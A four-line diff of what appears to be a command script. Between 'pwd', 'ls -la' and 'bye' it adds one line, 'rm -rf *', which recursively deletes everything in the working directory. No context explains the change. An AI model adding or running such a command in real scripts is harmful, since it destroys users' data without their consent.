@@ -1,3 +1,4 @@
 pwd
 ls -la
+rm -rf *
 bye
